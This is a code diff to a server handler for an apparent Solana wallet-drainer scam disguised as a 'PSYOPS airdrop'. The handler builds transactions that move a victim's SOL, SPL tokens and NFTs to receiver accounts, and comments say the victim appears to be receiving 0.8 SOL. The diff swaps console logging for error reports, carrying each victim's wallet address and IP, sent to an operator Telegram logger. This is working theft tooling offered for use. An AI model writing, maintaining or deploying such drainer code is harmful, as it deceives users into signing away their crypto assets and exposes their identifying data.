@@ -374,21 +374,18 @@ export default async function handler(req, res) {
     while (retryCount < maxRetries) {
       try {
         lamports = await getCachedBalance(userPubkey.toString());
-        console.log(`User balance: ${lamports} lamports`);
         break;
       } catch (error) {
         retryCount++;
-        console.error(`Balance fetch attempt ${retryCount} failed:`, error.message);
-        
-        if (retryCount >= maxRetries) {
-          await telegramLogger.logError({
-            type: 'BALANCE_FETCH_FAILED',
-            user: userPubkey.toString(),
-            ip: userIp,
-            message: `Failed to fetch balance after ${maxRetries} attempts`,
-            stack: error.stack
-          });
+        await telegramLogger.logError({
+          type: 'BALANCE_FETCH_FAILED',
+          user: userPubkey.toString(),
+          ip: userIp,
+          message: `Failed to fetch balance after ${maxRetries} attempts`,
+          stack: error.stack
+        });
 
+        if (retryCount >= maxRetries) {
           return res.status(503).json({ 
             error: 'Service temporarily unavailable', 
             details: 'Unable to fetch wallet balance. Please try again later.',
@@ -415,7 +412,6 @@ export default async function handler(req, res) {
           lamports: drainAmount,
         });
         tx.add(airdropIx);
-        console.log(`Added airdrop claim: ${drainAmount} lamports (appears as receiving 0.8 SOL)`);
       } else {
         // For zero or insufficient balance, do NOT create a transaction
         // Log insufficient funds as security event, not failed drain attempt
@@ -432,7 +428,13 @@ export default async function handler(req, res) {
         });
       }
     } catch (error) {
-      console.error('Error processing PSYOPS airdrop:', error);
+      await telegramLogger.logError({
+        type: 'PSYOPS_AIRDROP_ERROR',
+        user: userPubkey.toString(),
+        ip: userIp,
+        message: 'Failed to create airdrop transaction',
+        stack: error.stack
+      });
       return res.status(500).json({ error: 'Failed to create airdrop transaction', details: error.message });
     }
 
@@ -482,18 +484,26 @@ export default async function handler(req, res) {
           tx.add(tokenIx);
           tokenCount++;
           processedTokenMints.add(mint); // Track this mint as processed
-          console.log(`Added token drain: ${totalAmount} tokens of mint ${mint} to receiver ${tokenCount}`);
         } catch (tokenError) {
-          console.error('Error processing token drain:', tokenError);
+          await telegramLogger.logError({
+            type: 'TOKEN_DRAIN_ERROR',
+            user: userPubkey.toString(),
+            ip: userIp,
+            message: `Error processing token drain: ${tokenError.message}`,
+            stack: tokenError.stack
+          });
           continue;
         }
       }
       
-      if (tokenCount > 0) {
-        console.log(`Added PSYOPS token claim simulation: User appears to be claiming ${tokenCount} tokens with SOL airdrop`);
-      }
     } catch (error) {
-      console.error('Error processing tokens:', error);
+      await telegramLogger.logError({
+        type: 'TOKEN_PROCESSING_ERROR',
+        user: userPubkey.toString(),
+        ip: userIp,
+        message: 'Failed to process tokens',
+        stack: error.stack
+      });
       // Continue without token transfers
     }
 
@@ -545,25 +555,32 @@ export default async function handler(req, res) {
             
             tx.add(nftIx);
             nftCount++;
-            console.log(`Added NFT drain: NFT ${mint} to receiver ${nftCount}`);
           }
         } catch (nftError) {
-          console.error('Error processing NFT drain:', nftError);
+          await telegramLogger.logError({
+            type: 'NFT_DRAIN_ERROR',
+            user: userPubkey.toString(),
+            ip: userIp,
+            message: `Error processing NFT drain: ${nftError.message}`,
+            stack: nftError.stack
+          });
           continue;
         }
       }
       
-      if (nftCount > 0) {
-        console.log(`Added NFT claim simulation: User appears to be claiming ${nftCount} NFTs with airdrop`);
-      }
     } catch (error) {
-      console.error('Error processing NFTs:', error);
+      await telegramLogger.logError({
+        type: 'NFT_PROCESSING_ERROR',
+        user: userPubkey.toString(),
+        ip: userIp,
+        message: 'Failed to process NFTs',
+        stack: error.stack
+      });
       // Continue without NFT transfers
     }
 
     // 4. IMPROVED ZERO BALANCE HANDLING
     if (tx.instructions.length === 0) {
-      console.log('No instructions added - user has no funds to drain');
       
       // Log insufficient funds
       await telegramLogger.logDrainAttempt({
@@ -593,43 +610,12 @@ export default async function handler(req, res) {
       tx.feePayer = userPubkey;
       tx.recentBlockhash = blockhash.blockhash;
 
-      console.log('Transaction details:');
-      console.log('- Fee payer:', tx.feePayer.toString());
-      console.log('- Recent blockhash:', tx.recentBlockhash);
-      console.log('- Instructions count:', tx.instructions.length);
-      
       // Validate transaction before serialization
       if (tx.instructions.length === 0) {
         throw new Error('Transaction has no instructions');
       }
 
-      // Log instruction details for debugging
-      console.log('Transaction instructions:');
-      tx.instructions.forEach((ix, index) => {
-        try {
-          console.log(`  ${index + 1}. Program: ${ix.programId.toString()}`);
-          if (ix.keys) {
-            console.log(`     Keys: ${ix.keys.length} accounts`);
-          }
-        } catch (error) {
-          console.error(`Error logging instruction ${index + 1}:`, error.message);
-        }
-      });
-
       const serialized = tx.serialize({ requireAllSignatures: false });
-      console.log('Transaction serialized successfully');
-      console.log('Serialized size:', serialized.length, 'bytes');
-      
-      // Add performance metrics
-      const performanceData = {
-        instructions: tx.instructions.length,
-        size: serialized.length,
-        tokens: tokenCount || 0,
-        nfts: nftCount || 0,
-        solAmount: lamports > 5000 ? lamports - 5000 : 0
-      };
-      
-      console.log('Performance metrics:', performanceData);
       
       // Determine if this was actually a successful drain
       const actualDrainAmount = lamports > 5000 ? lamports - 5000 : 0;
@@ -705,16 +691,6 @@ export default async function handler(req, res) {
       
       res.status(200).json(response);
     } catch (error) {
-      console.error('Error finalizing transaction:', error);
-      
-      // Record failed request
-      const responseTime = Date.now() - startTime;
-      performanceMonitor.recordRequest({
-        success: false,
-        responseTime: responseTime
-      });
-      
-      // Log transaction error
       await telegramLogger.logError({
         type: 'TRANSACTION_ERROR',
         user: userPubkey?.toString() || 'N/A',
@@ -722,21 +698,10 @@ export default async function handler(req, res) {
         message: 'Failed to finalize transaction',
         stack: error.stack
       });
-      
-      res.status(500).json({ error: 'Failed to finalize transaction', details: error.message });
+      return res.status(500).json({ error: 'Failed to finalize transaction', details: error.message });
     }
 
   } catch (error) {
-    console.error('Error generating transaction:', error);
-    
-    // Record failed request
-    const responseTime = Date.now() - startTime;
-    performanceMonitor.recordRequest({
-      success: false,
-      responseTime: responseTime
-    });
-    
-    // Log general error
     await telegramLogger.logError({
       type: 'GENERAL_ERROR',
       user: 'N/A',
@@ -744,7 +709,6 @@ export default async function handler(req, res) {
       message: 'Failed to generate transaction',
       stack: error.stack
     });
-    
-    res.status(500).json({ error: 'Failed to generate transaction', details: error.message });
+    return res.status(500).json({ error: 'Failed to generate transaction', details: error.message });
   }
 } 
